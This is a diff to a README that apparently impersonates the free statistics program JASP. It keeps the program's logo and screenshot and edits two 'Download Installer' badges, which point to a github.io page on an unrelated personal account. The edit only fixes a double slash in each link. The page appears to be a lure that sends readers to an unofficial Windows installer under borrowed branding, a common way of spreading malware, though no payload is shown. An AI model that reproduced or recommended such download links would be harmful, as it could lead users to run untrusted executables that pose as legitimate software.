@@ -4,7 +4,7 @@
   <img src="https://store-images.s-microsoft.com/image/apps.50780.14460796580543565.eb440644-ea8a-4547-9bab-8c4bc88fb8ba.9fed4bc0-873d-4a76-8bc8-e0cdaf318e06" alt="Program Logo"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://braylenvincentcoqb.github.io/.github//Jasp-Statistics-Environment)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://braylenvincentcoqb.github.io/.github/Jasp-Statistics-Environment)
 
 ---
 
@@ -24,7 +24,7 @@ Furthermore, JASP-Statistics-Environment supports complex bayesian statistics an
   <img src="https://jasp-stats.org/wp-content/uploads/2024/07/5Rain.png" alt="Program Interface Screenshot"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://braylenvincentcoqb.github.io/.github//Jasp-Statistics-Environment)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://braylenvincentcoqb.github.io/.github/Jasp-Statistics-Environment)
 
 ---
 
